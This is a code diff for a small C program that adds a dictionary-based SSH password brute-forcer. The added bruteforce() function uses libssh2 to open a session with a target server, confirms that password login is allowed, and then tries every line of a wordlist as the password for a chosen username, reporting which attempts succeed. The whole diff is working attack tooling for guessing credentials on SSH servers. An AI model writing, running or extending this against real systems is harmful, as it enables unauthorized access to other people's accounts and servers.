@@ -1,6 +1,7 @@
 #include "status.h"
 #include "tcp.h"
 #include "lines.h"
+#include "ssh.h"
 #include <unistd.h>
 
 status_t get_args (const char* (*address),
@@ -15,6 +16,40 @@ status_t get_args (const char* (*address),
 	(*username) = argv [2];
 	(*dict_filename) = argv [3];
 	return success ();
+}
+
+status_t bruteforce (int ssh_socket, const char* username, FILE* dict_file)
+{
+	LIBSSH2_SESSION* session = libssh2_session_init ();
+	if (session == NULL)
+		return failure ("Failed to initialize an SSH session");
+	if (libssh2_session_startup (session, ssh_socket) != 0)
+		return sshfailure (session);
+
+	const char* userauth_list = libssh2_userauth_list (session, username, strlen (username));
+	if (strstr (userauth_list, "password") == NULL) // TODO: commas
+		return failure ("The SSH server does not support passwords");
+
+	line_t line;
+	status_t status = make_line (&line);
+	if (failed (status))
+		return status;
+
+	while (1) {
+		status_t status = get_line (&line, dict_file);
+		if (failed (status))
+			return status;
+		if (feof (dict_file))
+			return success ();
+
+		const char* password = line.ntbs;
+		printf ("Testing \"%s\"... ", password);
+		fflush (stdout);
+		if (libssh2_userauth_password(session, username, password)<0)
+			printf ("failed.\n");
+		else
+			printf ("success.\n");
+	}
 }
 
 int main (int argc, const char* const* argv)
@@ -32,14 +67,8 @@ int main (int argc, const char* const* argv)
 	FILE* dict_file = fopen (dict_filename, "r");
 	raw_check (dict_file != NULL, "Could not open %s for reading", dict_filename);
 
-	line_t line;
-	check (make_line (&line), "General failure");
-	while (1) {
-		check (get_line (&line, dict_file), "Failed to read password");
-		if (feof (dict_file))
-			break;
-		printf ("%s\n", line.ntbs);
-	}
+	check (bruteforce (ssh_socket, username, dict_file),
+	       "Could not bruteforce ssh:%s@%s", username, address);
 
 	close (ssh_socket);
 	fclose (dict_file);
